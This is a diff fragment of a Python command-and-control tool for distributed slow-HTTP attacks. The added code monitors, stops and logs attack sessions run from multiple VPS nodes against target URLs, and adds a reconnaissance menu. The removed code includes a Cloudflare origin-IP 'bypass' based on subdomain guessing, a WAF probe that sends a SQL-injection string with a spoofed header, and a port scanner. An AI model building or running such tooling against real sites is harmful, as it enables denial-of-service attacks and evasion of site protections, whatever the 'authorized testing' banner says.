+                            vps_results[vps_ip] = []
+                        vps_results[vps_ip].append(result)
+                    
+                    # Display latest result for each VPS
+                    headers = ["VPS", "Connections", "Packets", "Bytes", "Errors", "CPU", "Memory", "Status"]
+                    data = []
+                    
+                    for vps_ip, vps_data in vps_results.items():
+                        latest = vps_data[0]  # Most recent result first
+                        
+                        status_str = latest['status']
+                        if status_str == 'running':
+                            status_str = f"{Colors.GREEN}{status_str}{Colors.RESET}"
+                        elif status_str == 'error':
+                            status_str = f"{Colors.RED}{status_str}{Colors.RESET}"
+                        else:
+                            status_str = f"{Colors.YELLOW}{status_str}{Colors.RESET}"
+                        
+                        data.append([
+                            vps_ip,
+                            latest['connections_active'],
+                            latest['packets_sent'],
+                            self._format_bytes(latest['bytes_sent']),
+                            latest['error_count'],
+                            f"{latest['cpu_usage']:.1f}%" if latest['cpu_usage'] is not None else 'N/A',
+                            f"{latest['memory_usage']:.1f}%" if latest['memory_usage'] is not None else 'N/A',
+                            status_str
+                        ])
+                    
+                    self.terminal.print_table(headers, data)
+                    
+                    # Calculate and show totals
+                    total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
+                    total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
+                    total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
+                    total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
+                    
+                    print(f"\n{Colors.BOLD}TOTALS:{Colors.RESET}")
+                    print(f"Connections: {total_connections} | Packets: {total_packets} | Data: {self._format_bytes(total_bytes)} | Errors: {total_errors}")
+                    
+                    # Show response codes if available
+                    response_codes = {}
+                    for result in results:
+                        if result['response_codes']:
+                            try:
+                                codes = json.loads(result['response_codes'])
+                                for code, count in codes.items():
+                                    if code not in response_codes:
+                                        response_codes[code] = 0
+                                    response_codes[code] += count
+                            except:
+                                pass
+                    
+                    if response_codes:
+                        print(f"\n{Colors.BOLD}RESPONSE CODES:{Colors.RESET}")
+                        for code, count in sorted(response_codes.items()):
+                            color = Colors.GREEN if code.startswith('2') else Colors.YELLOW if code.startswith('3') else Colors.RED
+                            print(f"{color}{code}: {count}{Colors.RESET}", end=" | ")
+                        print()
+                else:
+                    print(f"\n{Colors.YELLOW}No results available yet{Colors.RESET}")
+                
+                print(f"\n{Colors.YELLOW}Press Ctrl+C to stop monitoring | Refreshing every {refresh_interval}s{Colors.RESET}")
+                
+                # Check if attack is still running
+                updated_session = self.db_manager.get_attack_session(session_id)
+                if updated_session['status'] != 'running':
+                    print(f"\n{Colors.YELLOW}Attack is no longer running (status: {updated_session['status']}){Colors.RESET}")
+                    input("Press Enter to continue...")
+                    break
+                
+                # Wait for refresh interval with check for keyboard interrupt
+                try:
+                    time.sleep(refresh_interval)
+                except KeyboardInterrupt:
+                    monitoring = False
+                    print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
+                    input("Press Enter to continue...")
+                
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}Stopped monitoring{Colors.RESET}")
+            input("Press Enter to continue...")
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error monitoring attack: {str(e)}")
+            logger.error(traceback.format_exc())
+            input("Press Enter to continue...")
+    
+    def _format_bytes(self, bytes_value):
+        """Format bytes to human-readable format"""
+        if bytes_value is None:
+            return 'N/A'
+        
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if bytes_value < 1024:
+                return f"{bytes_value:.1f} {unit}"
+            bytes_value /= 1024
+        return f"{bytes_value:.1f} TB"
+    
+    def stop_attack(self, session_id):
+        """Stop an attack"""
+        session = self.db_manager.get_attack_session(session_id)
+        
+        if not session:
+            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        if session['status'] != 'running':
+            print(f"{Colors.YELLOW}[WARNING] Attack is not running (status: {session['status']}){Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        confirm = input(f"{Colors.RED}Stop attack '{session['session_name']}'? (y/N): {Colors.RESET}").strip().lower()
+        
+        if confirm == 'y':
+            print(f"{Colors.YELLOW}[STOPPING] Sending stop command to all VPS nodes...{Colors.RESET}")
+            
+            success = self.attack_manager.stop_attack(session_id)
+            
+            if success:
+                print(f"{Colors.GREEN}[SUCCESS] Attack stopped successfully{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}[ERROR] Failed to stop attack{Colors.RESET}")
+        else:
+            print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
+        
+        input("Press Enter to continue...")
+    
+    def view_attack_details(self, session_id):
+        """View attack details"""
+        session = self.db_manager.get_attack_session(session_id)
+        
+        if not session:
+            print(f"{Colors.RED}[ERROR] Attack session not found{Colors.RESET}")
+            input("Press Enter to continue...")
+            return
+        
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}ATTACK DETAILS: {session['session_name']}{Colors.RESET}")
+        print("=" * 50)
+        
+        print(f"ID: {session['id']}")
+        print(f"Target URL: {session['target_url']}")
+        print(f"Target Host: {session['target_host'] or 'N/A'}")
+        print(f"Attack Type: {session['attack_type']}")
+        print(f"Status: {session['status']}")
+        
+        # Format timestamps
+        start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
+        end_time = session['end_time'][:19] if session['end_time'] else 'N/A'
+        print(f"Start Time: {start_time}")
+        print(f"End Time: {end_time}")
+        
+        # Calculate duration
+        if session['start_time'] and session['end_time']:
+            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+            end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
+            duration = (end - start).total_seconds()
+            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
+            print(f"Duration: {duration_str}")
+        elif session['start_time'] and session['status'] == 'running':
+            start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+            duration = (datetime.now() - start).total_seconds()
+            duration_str = f"{int(duration // 3600)}h {int((duration % 3600) // 60)}m {int(duration % 60)}s"
+            print(f"Duration: {duration_str} (ongoing)")
+        
+        # VPS nodes
+        vps_list = session['vps_nodes'].split(',') if session['vps_nodes'] else []
+        print(f"VPS Nodes: {len(vps_list)}")
+        for vps in vps_list:
+            print(f"  - {vps}")
+        
+        # Parameters
+        print("\nParameters:")
+        try:
+            parameters = json.loads(session['parameters']) if session['parameters'] else {}
+            for key, value in parameters.items():
+                print(f"  {key}: {value}")
+        except:
+            print("  Unable to parse parameters")
+        
+        # Results summary
+        results = self.db_manager.get_attack_results(session_id)
+        if results:
+            print("\nResults Summary:")
+            total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
+            total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
+            total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
+            total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
+            
+            print(f"  Total Connections: {total_connections}")
+            print(f"  Total Packets: {total_packets}")
+            print(f"  Total Data: {self._format_bytes(total_bytes)}")
+            print(f"  Total Errors: {total_errors}")
+            
+            # Response codes
+            response_codes = {}
+            for result in results:
+                if result['response_codes']:
+                    try:
+                        codes = json.loads(result['response_codes'])
+                        for code, count in codes.items():
+                            if code not in response_codes:
+                                response_codes[code] = 0
+                            response_codes[code] += count
+                    except:
+                        pass
+            
+            if response_codes:
+                print("\nResponse Codes:")
+                for code, count in sorted(response_codes.items()):
+                    print(f"  {code}: {count}")
+        
+        # Notes
+        if session['notes']:
+            print("\nNotes:")
+            print(f"  {session['notes']}")
+        
+        input("\nPress Enter to continue...")
+    
+    def attack_history_menu(self):
+        """Attack history menu"""
+        self.terminal.clear_screen()
+        self.terminal.print_banner(VERSION)
+        
+        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
+        print("=" * 50)
+        
+        sessions = self.db_manager.get_attack_sessions(limit=20)
+        
+        if sessions:
+            # Convert to list of lists for table printing
+            headers = ["ID", "Session Name", "Target", "Attack Type", "Status", "Started", "Duration"]
+            data = []
+            
+            for session in sessions:
+                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
+                
+                # Calculate duration
+                if session['start_time'] and session['end_time']:
+                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+                    end = datetime.fromisoformat(session['end_time'].replace('Z', '+00:00'))
+                    duration = (end - start).total_seconds()
+                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
+                elif session['start_time'] and session['status'] == 'running':
+                    start = datetime.fromisoformat(session['start_time'].replace('Z', '+00:00'))
+                    duration = (datetime.now() - start).total_seconds()
+                    duration_str = f"{int(duration // 60)}m {int(duration % 60)}s"
+                else:
+                    duration_str = 'N/A'
+                
+                # Format status
+                status = session['status']
+                if status == 'running':
+                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}"
+                elif status == 'completed':
+                    status_str = f"{Colors.BLUE}{status}{Colors.RESET}"
+                elif status == 'failed':
+                    status_str = f"{Colors.RED}{status}{Colors.RESET}"
+                else:
+                    status_str = f"{Colors.YELLOW}{status}{Colors.RESET}"
+                
+                data.append([
+                    session['id'],
+                    session['session_name'],
+                    session['target_host'] or session['target_url'],
+                    session['attack_type'],
+                    status_str,
+                    start_time,
+                    duration_str
+                ])
+            
+            self.terminal.print_table(headers, data)
+            
+            session_id = self.terminal.input_with_prompt("\nEnter session ID to view details (or Enter to go back): ", False)
+            if session_id and session_id.isdigit():
+                self.view_attack_details(int(session_id))
+        else:
+            print(f"\n{Colors.YELLOW}No attack history{Colors.RESET}")
+            input("Press Enter to continue...")
+    
+    def network_tools_menu(self):
+        """Network reconnaissance tools menu"""
+        while self.running:
+            self.terminal.clear_screen()
+            self.terminal.print_banner(VERSION)
+            
+            print(f"{Colors.BOLD}NETWORK RECONNAISSANCE TOOLS{Colors.RESET}")
+            print("=" * 50)
+            
+            menu = f"""
+{Colors.BOLD}AVAILABLE TOOLS:{Colors.RESET}
+{Colors.GREEN}[1]{Colors.RESET} DNS Lookup
+{Colors.GREEN}[2]{Colors.RESET} WAF Detection
+{Colors.GREEN}[3]{Colors.RESET} Port Scanner
+{Colors.GREEN}[4]{Colors.RESET} Cloudflare Detector
+{Colors.GREEN}[5]{Colors.RESET} SSL Information
+{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu
+
+{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
+            
+            print(menu)
+            choice = input().strip()
+            
+            if choice == '1':
+                self.dns_lookup_tool()
+            elif choice == '2':
+                self.waf_detection_tool()
+            elif choice == '3':
+                self.port_scanner_tool()
+            elif choice == '4':
+                self.cloudflare_detector_tool()
+            elif choice == '5':
+                self.ssl_info_tool()
+            elif choice == '0':
+                break
+            else:
+                print(f"{Colors.RED}Invalid option{Colors.RESET}")
+                time.sleep(1)
+    
+    def dns_lookup_tool(self):
+        """DNS lookup tool"""
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}DNS LOOKUP TOOL{Colors.RESET}")
+        print("=" * 50)
+        
+        domain = self.terminal.input_with_prompt("Enter domain name: ")
+        if not domain:
+            return
+        
+        print(f"\n{Colors.YELLOW}[INFO] Looking up DNS records for {domain}...{Colors.RESET}")
+        
+        try:
+            results = self.network_tools.lookup_dns_history(domain)
+            
+            print(f"\n{Colors.BOLD}CURRENT DNS RECORDS:{Colors.RESET}")
+            for record_type, records in results['current_records'].items():
+                if records:
+                    print(f"{Colors.GREEN}{record_type}:{Colors.RESET}")
+                    for record in records:
+                        print(f"  {record}")
+            
+            if results['historical_records']:
+                print(f"\n{Colors.BOLD}HISTORICAL DNS RECORDS:{Colors.RESET}")
+                for record in results['historical_records']:
+                    print(f"  {record['date']} - {record['record_type']}: {record['value']}")
+            
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error in DNS lookup: {str(e)}")
             logger.error(traceback.format_exc())
         
         input("\nPress Enter to continue...")
-
-class TerminalHelper:
-    """Helper class for terminal operations and input handling"""
     
-    @staticmethod
-    def clear_screen():
-        """Clear the terminal screen"""
-        os.system('cls' if os.name == 'nt' else 'clear')
-    
-    @staticmethod
-    def print_banner(version):
-        """Print the tool banner"""
-        banner = f"""{Colors.CYAN}{Colors.BOLD}
-╔════════════════════════════════════════════════════════════════════════════╗
-║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
-║                         ADVANCED EDITION v{version}                               ║
-╚════════════════════════════════════════════════════════════════════════════╝
-
-{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
-{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}
-
-"""
-        print(banner)
-    
-    @staticmethod
-    def print_status_bar(message, status="info"):
-        """Print a status bar with color based on status"""
-        color = Colors.CYAN
-        if status == "success":
-            color = Colors.GREEN
-        elif status == "warning":
-            color = Colors.YELLOW
-        elif status == "error":
-            color = Colors.RED
+    def waf_detection_tool(self):
+        """WAF detection tool"""
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}WAF DETECTION TOOL{Colors.RESET}")
+        print("=" * 50)
         
-        width = shutil.get_terminal_size().columns - 2
-        print(f"{color}{message.center(width)}{Colors.RESET}")
-    
-    @staticmethod
-    def print_table(headers, data, widths=None):
-        """Print a formatted table"""
-        if not widths:
-            # Calculate column widths
-            widths = []
-            for i in range(len(headers)):
-                col_width = len(headers[i])
-                for row in data:
-                    if i < len(row):
-                        col_width = max(col_width, len(str(row[i])))
-                widths.append(col_width + 2)  # Add padding
+        target = self.terminal.input_with_prompt("Enter target URL: ")
+        if not target:
+            return
         
-        # Print headers
-        header_row = ""
-        for i, header in enumerate(headers):
-            header_row += f"{Colors.BOLD}{header.ljust(widths[i])}{Colors.RESET}"
-        print(header_row)
+        # Add http:// if not present
+        if not target.startswith('http'):
+            target = 'http://' + target
         
-        # Print separator
-        separator = "-" * sum(widths)
-        print(separator)
-        
-        # Print data
-        for row in data:
-            row_str = ""
-            for i, cell in enumerate(row):
-                if i < len(widths):
-                    row_str += f"{str(cell).ljust(widths[i])}"
-            print(row_str)
-    
-    @staticmethod
-    def get_input_with_timeout(prompt, timeout=5):
-        """Get input with timeout using select"""
-        print(prompt, end="", flush=True)
-        
-        # Set stdin to non-blocking mode
-        old_settings = None
-        fd = sys.stdin.fileno()
+        print(f"\n{Colors.YELLOW}[INFO] Detecting WAF on {target}...{Colors.RESET}")
         
         try:
-            if os.name == 'posix':  # Unix/Linux/MacOS
-                import termios
-                import tty
-                old_settings = termios.tcgetattr(fd)
-                tty.setraw(fd)
+            results = self.network_tools.detect_waf(target)
             
-            # Use select to wait for input with timeout
-            rlist, _, _ = select.select([sys.stdin], [], [], timeout)
-            
-            if rlist:
-                # Input is available
-                if os.name == 'posix':
-                    # For Unix-like systems
-                    input_str = ""
-                    while True:
-                        char = sys.stdin.read(1)
-                        if char == '\r' or char == '\n':
-                            break
-                        input_str += char
-                        # Echo the character
-                        sys.stdout.write(char)
-                        sys.stdout.flush()
-                    print()  # New line after input
-                    return input_str
-                else:
-                    # For Windows
-                    return input()
+            if results['waf_detected']:
+                print(f"\n{Colors.GREEN}[DETECTED] WAF detected!{Colors.RESET}")
+                print(f"WAF Type: {results['waf_type'] or 'Unknown'}")
+                
+                print(f"\n{Colors.BOLD}DETECTION EVIDENCE:{Colors.RESET}")
+                for evidence in results['evidence']:
+                    print(f"  - {evidence}")
             else:
-                # Timeout occurred
-                print()  # Move to next line
-                return None
-        finally:
-            # Restore terminal settings
-            if os.name == 'posix' and old_settings:
-                import termios
-                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-    
-    @staticmethod
-    def input_with_prompt(prompt, required=True, validate_func=None):
-        """Enhanced input with validation function support"""
-        while True:
-            try:
-                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
+                print(f"\n{Colors.YELLOW}[RESULT] No WAF detected{Colors.RESET}")
                 
-                if not required and not value:
-                    return value
-                    
-                if required and not value:
-                    print(f"{Colors.RED}This field is required{Colors.RESET}")
-                    continue
-                    
-                if validate_func and value:
-                    valid, message = validate_func(value)
-                    if not valid:
-                        print(f"{Colors.RED}{message}{Colors.RESET}")
-                        continue
-                        
-                return value
-            except KeyboardInterrupt:
-                return None
-    
-    @staticmethod
-    def progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
-        """Display a progress bar"""
-        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
-        filled_length = int(length * iteration // total)
-        bar = fill * filled_length + '-' * (length - filled_length)
-        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
-        if iteration == total:
-            print()
-
-class NetworkTools:
-    """Advanced network reconnaissance and analysis tools"""
-    
-    def __init__(self):
-        """Initialize network tools"""
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
-        ]
-        
-        # Cloudflare IP ranges (simplified)
-        self.cloudflare_ranges = [
-            "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
-            "104.16.0.0/12", "108.162.192.0/18", "131.0.72.0/22",
-            "141.101.64.0/18", "162.158.0.0/15", "172.64.0.0/13",
-            "173.245.48.0/20", "188.114.96.0/20", "190.93.240.0/20",
-            "197.234.240.0/22", "198.41.128.0/17"
-        ]
-        
-        # Common WAF signatures
-        self.waf_signatures = {
-            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
-            "Akamai": ["akamai", "akamaighost", "akamaiedge"],
-            "Imperva": ["incap_ses", "visid_incap", "incapsula"],
-            "Sucuri": ["sucuri", "sucuri-scanner"],
-            "ModSecurity": ["mod_security", "modsecurity"],
-            "F5 BIG-IP": ["bigip", "f5_cspm", "ts"],
-            "AWS WAF": ["awselb", "awsalb"]
-        }
-    
-    def lookup_dns_history(self, domain):
-        """Look up DNS history for a domain"""
-        logger.info(f"Looking up DNS history for {domain}")
-        
-        results = {
-            "domain": domain,
-            "current_records": {},
-            "historical_records": []
-        }
-        
-        # Get current DNS records
-        try:
-            # A records
-            try:
-                ip_addresses = socket.gethostbyname_ex(domain)[2]
-                results["current_records"]["A"] = ip_addresses
-            except:
-                results["current_records"]["A"] = []
+            if results['cloudflare_detected']:
+                print(f"\n{Colors.CYAN}[INFO] Cloudflare protection detected{Colors.RESET}")
             
-            # Try to get additional records using dig if available
-            if os.system("which dig > /dev/null 2>&1") == 0:
-                # MX records
-                try:
-                    mx_output = subprocess.check_output(f"dig MX {domain} +short", shell=True).decode('utf-8').strip()
-                    if mx_output:
-                        results["current_records"]["MX"] = mx_output.split('\n')
-                    else:
-                        results["current_records"]["MX"] = []
-                except:
-                    results["current_records"]["MX"] = []
-                
-                # NS records
-                try:
-                    ns_output = subprocess.check_output(f"dig NS {domain} +short", shell=True).decode('utf-8').strip()
-                    if ns_output:
-                        results["current_records"]["NS"] = ns_output.split('\n')
-                    else:
-                        results["current_records"]["NS"] = []
-                except:
-                    results["current_records"]["NS"] = []
-                
-                # TXT records
-                try:
-                    txt_output = subprocess.check_output(f"dig TXT {domain} +short", shell=True).decode('utf-8').strip()
-                    if txt_output:
-                        results["current_records"]["TXT"] = txt_output.split('\n')
-                    else:
-                        results["current_records"]["TXT"] = []
-                except:
-                    results["current_records"]["TXT"] = []
-            
-            # Use dnspython if available
-            if DNS_AVAILABLE:
-                try:
-                    resolver = dns.resolver.Resolver()
-                    
-                    # Try to get AAAA records
-                    try:
-                        answers = resolver.resolve(domain, 'AAAA')
-                        results["current_records"]["AAAA"] = [str(rdata) for rdata in answers]
-                    except:
-                        results["current_records"]["AAAA"] = []
-                    
-                    # Try to get CNAME records
-                    try:
-                        answers = resolver.resolve(domain, 'CNAME')
-                        results["current_records"]["CNAME"] = [str(rdata) for rdata in answers]
-                    except:
-                        results["current_records"]["CNAME"] = []
-                    
-                    # Try to get SOA records
-                    try:
-                        answers = resolver.resolve(domain, 'SOA')
-                        results["current_records"]["SOA"] = [str(rdata) for rdata in answers]
-                    except:
-                        results["current_records"]["SOA"] = []
-                except:
-                    pass
         except Exception as e:
-            logger.error(f"Error getting DNS records: {e}")
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error in WAF detection: {str(e)}")
+            logger.error(traceback.format_exc())
         
-        # Try to get historical DNS data
-        # In a real implementation, you would use an API like SecurityTrails or VirusTotal
-        # For this example, we'll use a placeholder
-        try:
-            logger.info("Attempting to fetch historical DNS data (placeholder)")
-            # This is a placeholder - in a real implementation you would use an actual API
-            results["historical_records"].append({
-                "date": "2023-01-01",
-                "record_type": "A",
-                "value": "203.0.113.1"
-            })
-            results["historical_records"].append({
-                "date": "2022-06-15",
-                "record_type": "A",
-                "value": "203.0.113.2"
-            })
-            results["historical_records"].append({
-                "date": "2022-01-10",
-                "record_type": "MX",
-                "value": "mail.example.com"
-            })
-        except Exception as e:
-            logger.error(f"Error getting historical DNS data: {e}")
-        
-        return results
+        input("\nPress Enter to continue...")
     
-    def detect_cloudflare(self, domain):
-        """Detect if a domain is behind Cloudflare"""
-        logger.info(f"Checking if {domain} is behind Cloudflare")
+    def port_scanner_tool(self):
+        """Port scanner tool"""
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}PORT SCANNER TOOL{Colors.RESET}")
+        print("=" * 50)
         
-        results = {
-            "domain": domain,
-            "is_behind_cloudflare": False,
-            "evidence": [],
-            "cloudflare_ips": [],
-            "direct_ips": []
-        }
+        target = self.terminal.input_with_prompt("Enter target host: ")
+        if not target:
+            return
         
-        # Method 1: Check DNS records
-        try:
-            ip_addresses = socket.gethostbyname_ex(domain)[2]
-            results["cloudflare_ips"] = []
-            
-            for ip in ip_addresses:
-                # Check if IP belongs to Cloudflare
-                # This is a simplified check - in reality, you'd use proper CIDR matching
-                is_cloudflare = any(ip.startswith(cidr.split('/')[0].rsplit('.', 1)[0]) for cidr in self.cloudflare_ranges)
-                
-                if is_cloudflare:
-                    results["cloudflare_ips"].append(ip)
-                    results["evidence"].append(f"IP {ip} belongs to Cloudflare range")
-                else:
-                    results["direct_ips"].append(ip)
-            
-            if results["cloudflare_ips"]:
-                results["is_behind_cloudflare"] = True
-        except Exception as e:
-            logger.error(f"Error checking IP addresses: {e}")
-        
-        # Method 2: Check HTTP headers
-        if REQUESTS_AVAILABLE:
-            try:
-                url = f"https://{domain}"
-                headers = {'User-Agent': random.choice(self.user_agents)}
-                
-                response = requests.get(url, headers=headers, timeout=10)
-                
-                # Check for Cloudflare headers
-                cf_headers = [h for h in response.headers if h.lower().startswith('cf-')]
-                if cf_headers:
-                    results["is_behind_cloudflare"] = True
-                    results["evidence"].append(f"Cloudflare headers detected: {', '.join(cf_headers)}")
-                
-                # Check for Cloudflare server
-                server = response.headers.get('Server', '')
-                if 'cloudflare' in server.lower():
-                    results["is_behind_cloudflare"] = True
-                    results["evidence"].append(f"Cloudflare server header detected: {server}")
-                
-                # Check for Cloudflare cookies
-                cookies = response.cookies
-                cf_cookies = [c for c in cookies if c.name.startswith('__cf')]
-                if cf_cookies:
-                    results["is_behind_cloudflare"] = True
-                    results["evidence"].append(f"Cloudflare cookies detected: {', '.join(c.name for c in cf_cookies)}")
-            except Exception as e:
-                logger.error(f"Error checking HTTP headers: {e}")
-        
-        return results
-    
-    def cloudflare_bypass(self, domain):
-        """Try to find the origin IP behind Cloudflare"""
-        logger.info(f"Attempting to find origin IP for {domain}")
-        
-        results = {
-            "domain": domain,
-            "is_behind_cloudflare": False,
-            "potential_origin_ips": [],
-            "methods_used": []
-        }
-        
-        # First check if the domain is behind Cloudflare
-        cf_check = self.detect_cloudflare(domain)
-        results["is_behind_cloudflare"] = cf_check["is_behind_cloudflare"]
-        
-        if not results["is_behind_cloudflare"]:
-            logger.info(f"{domain} does not appear to be behind Cloudflare")
-            results["potential_origin_ips"] = cf_check["direct_ips"]
-            return results
-        
-        logger.info(f"{domain} appears to be behind Cloudflare")
-        
-        # Method 1: Check historical DNS records
-        try:
-            logger.info("Checking historical DNS records")
-            results["methods_used"].append("historical_dns")
-            
-            # This is a placeholder - in a real implementation you would use an actual API
-            historical_ip = "203.0.113.10"  # Example IP
-            results["potential_origin_ips"].append(historical_ip)
-        except Exception as e:
-            logger.error(f"Error checking historical DNS: {e}")
-        
-        # Method 2: Check for subdomains that might bypass Cloudflare
-        try:
-            logger.info("Checking for subdomains that might bypass Cloudflare")
-            results["methods_used"].append("subdomain_check")
-            
-            common_subdomains = ["direct", "origin", "backend", "api", "staging", "dev", "development", "cpanel", "ftp", "mail"]
-            
-            for subdomain in common_subdomains:
-                try:
-                    subdomain_fqdn = f"{subdomain}.{domain}"
-                    ip = socket.gethostbyname(subdomain_fqdn)
-                    
-                    # Check if this IP is different from Cloudflare IPs
-                    is_cloudflare = any(ip.startswith(cidr.split('/')[0].rsplit('.', 1)[0]) for cidr in self.cloudflare_ranges)
-                    
-                    if not is_cloudflare:
-                        logger.info(f"Found potential origin IP via subdomain {subdomain_fqdn}: {ip}")
-                        results["potential_origin_ips"].append(ip)
-                except:
-                    pass
-        except Exception as e:
-            logger.error(f"Error checking subdomains: {e}")
-        
-        # Method 3: Check SSL certificate information
-        try:
-            logger.info("Checking SSL certificate information")
-            results["methods_used"].append("ssl_certificate")
-            
-            # This is a placeholder - in a real implementation you would extract IPs from SSL certificates
-            cert_ip = "203.0.113.20"  # Example IP
-            results["potential_origin_ips"].append(cert_ip)
-        except Exception as e:
-            logger.error(f"Error checking SSL certificate: {e}")
-        
-        # Remove duplicates
-        results["potential_origin_ips"] = list(set(results["potential_origin_ips"]))
-        
-        return results
-    
-    def detect_waf(self, url):
-        """Detect if a website is protected by a WAF and identify the type"""
-        logger.info(f"Checking for WAF protection on {url}")
-        
-        results = {
-            "url": url,
-            "waf_detected": False,
-            "waf_type": None,
-            "evidence": []
-        }
-        
-        if not REQUESTS_AVAILABLE:
-            logger.warning("Requests module not available, cannot detect WAF")
-            return results
-        
-        try:
-            # Make a normal request
-            headers = {'User-Agent': random.choice(self.user_agents)}
-            response = requests.get(url, headers=headers, timeout=10)
-            
-            # Check response headers for WAF signatures
-            for waf_name, signatures in self.waf_signatures.items():
-                for signature in signatures:
-                    # Check in headers
-                    for header, value in response.headers.items():
-                        if signature.lower() in header.lower() or signature.lower() in value.lower():
-                            results["waf_detected"] = True
-                            results["waf_type"] = waf_name
-                            results["evidence"].append(f"Header match: {header}: {value}")
-                    
-                    # Check in cookies
-                    for cookie in response.cookies:
-                        if signature.lower() in cookie.name.lower() or signature.lower() in cookie.value.lower():
-                            results["waf_detected"] = True
-                            results["waf_type"] = waf_name
-                            results["evidence"].append(f"Cookie match: {cookie.name}")
-            
-            # If no WAF detected yet, try a potentially malicious request
-            if not results["waf_detected"]:
-                test_url = f"{url}/?id=1' OR '1'='1"
-                test_headers = {
-                    'User-Agent': random.choice(self.user_agents),
-                    'X-Forwarded-For': '127.0.0.1',
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
-                
-                try:
-                    test_response = requests.get(test_url, headers=test_headers, timeout=10)
-                    
-                    # Check if we got blocked or challenged
-                    if test_response.status_code in [403, 406, 429, 503]:
-                        results["waf_detected"] = True
-                        results["waf_type"] = "Unknown WAF"
-                        results["evidence"].append(f"Blocked suspicious request with status code {test_response.status_code}")
-                    
-                    # Check for WAF keywords in response body
-                    waf_keywords = ["firewall", "security", "blocked", "suspicious", "malicious", "attack", "protection"]
-                    for keyword in waf_keywords:
-                        if keyword in test_response.text.lower():
-                            results["waf_detected"] = True
-                            results["waf_type"] = "Unknown WAF"
-                            results["evidence"].append(f"WAF keyword '{keyword}' found in response")
-                except:
-                    # If the request fails, it might be due to WAF blocking
-                    results["waf_detected"] = True
-                    results["waf_type"] = "Unknown WAF"
-                    results["evidence"].append("Request with suspicious parameters was blocked")
-        except Exception as e:
-            logger.error(f"Error detecting WAF: {e}")
-        
-        return results
-    
-    def scan_ports(self, target, ports=None):
-        """Scan common ports on a target"""
-        logger.info(f"Scanning ports on {target}")
-        
-        if not ports:
-            # Common ports to scan
-            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
-        
-        results = {
-            "target": target,
-            "open_ports": [],
-            "closed_ports": [],
-            "filtered_ports": []
-        }
-        
-        for port in ports:
-            try:
-                # Create socket
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                
-                # Try to connect
-                result = s.connect_ex((target, port))
-                
-                if result == 0:
-                    # Port is open
-                    service = self._get_service_name(port)
-                    results["open_ports"].append({"port": port, "service": service})
-                    logger.info(f"Port {port} ({service}) is open on {target}")
-                else:
-                    # Port is closed or filtered
-                    results["closed_ports"].append(port)
-                
-                s.close()
-            except socket.gaierror:
-                logger.error(f"Hostname {target} could not be resolved")
-                break
-            except socket.error:
-                results["filtered_ports"].append(port)
-            except Exception as e:
-                logger.error(f"Error scanning port {port}: {e}")
-        
-        return results
-    
-    def _get_service_name(self, port):
-        """Get service name for common ports"""
-        common_ports = {
-            21: "FTP",
-            22: "SSH",
-            23: "Telnet",
-            25: "SMTP",
-            53: "DNS",
-            80: "HTTP",
